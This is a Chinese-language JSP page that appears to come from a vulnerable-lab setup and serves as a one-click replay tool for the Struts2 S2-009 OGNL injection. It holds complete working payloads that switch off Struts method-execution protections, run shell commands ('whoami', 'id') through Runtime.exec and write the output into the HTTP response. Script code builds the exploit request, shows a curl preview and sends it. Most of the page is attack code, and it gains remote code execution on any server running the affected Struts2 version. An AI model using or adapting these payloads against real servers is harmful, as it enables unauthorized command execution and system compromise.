<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-009 示例页</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        .field input { padding: 12px 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.5 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-009 示例页</h1>
        <p>把 OGNL 表达式放进 <code>name</code> 参数，再用额外的 <code>z[(name)('meh')]</code> 重新执行。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('whoami')">回显 whoami</button>
            <button type="button" class="preset-btn" onclick="fillPreset('id')">回显 id</button>
            <button type="button" class="submit-btn" onclick="runPayload()">重放 S2-009 Payload</button>
        </div>
        <div class="field">
            <label for="payloadBox">name 参数里的表达式</label>
            <textarea id="payloadBox">(#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=new java.lang.Boolean(true),#p=@java.lang.Runtime@getRuntime().exec('whoami'),#r=new java.io.BufferedReader(new java.io.InputStreamReader(#p.getInputStream())),#buf=new char[256],#len=#r.read(#buf),#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#o.println(new java.lang.String(#buf,0,#len)),#o.close())</textarea>
        </div>
        <div class="field">
            <label for="ageBox">辅助 age 参数</label>
            <input id="ageBox" value="123"/>
        </div>
        <pre id="requestPreview"></pre>
    </div>
    <div class="card">
        <h2>说明</h2>
        <ol>
            <li><code>name</code> 的值先进入 action 上下文。</li>
            <li>再通过 <code>z[(name)('meh')]=true</code> 把它作为表达式执行。</li>
            <li>如果漏洞命中，命令输出会直接写回响应。</li>
        </ol>
    </div>
</div>
<script>
    const payloads = {
        whoami: '(#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=new java.lang.Boolean(true),#p=@java.lang.Runtime@getRuntime().exec(\'whoami\'),#r=new java.io.BufferedReader(new java.io.InputStreamReader(#p.getInputStream())),#buf=new char[256],#len=#r.read(#buf),#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#o.println(new java.lang.String(#buf,0,#len)),#o.close())',
        id: '(#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=new java.lang.Boolean(true),#p=@java.lang.Runtime@getRuntime().exec(\'id\'),#r=new java.io.BufferedReader(new java.io.InputStreamReader(#p.getInputStream())),#buf=new char[256],#len=#r.read(#buf),#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#o.println(new java.lang.String(#buf,0,#len)),#o.close())'
    };

    function strictEncode(value) {
        return encodeURIComponent(value).replace(/[!'()*]/g, function(char) {
            return '%' + char.charCodeAt(0).toString(16).toUpperCase();
        });
    }

    function fillPreset(key) {
        document.getElementById('payloadBox').value = payloads[key];
        refreshPreview();
    }

    function buildQuery() {
        const payload = document.getElementById('payloadBox').value;
        const age = document.getElementById('ageBox').value;
        return 'example5.action?age=' + strictEncode(age) + '&name=' + strictEncode(payload + '(meh)') + '&z%5B(name)(%27meh%27)%5D=true';
    }

    function refreshPreview() {
        document.getElementById('requestPreview').textContent = 'curl -i "http://宿主机IP:9961/' + buildQuery() + '"';
    }

    function runPayload() {
        location.href = buildQuery();
    }

    document.getElementById('payloadBox').addEventListener('input', refreshPreview);
    document.getElementById('ageBox').addEventListener('input', refreshPreview);
    refreshPreview();
</script>
</body>
</html>
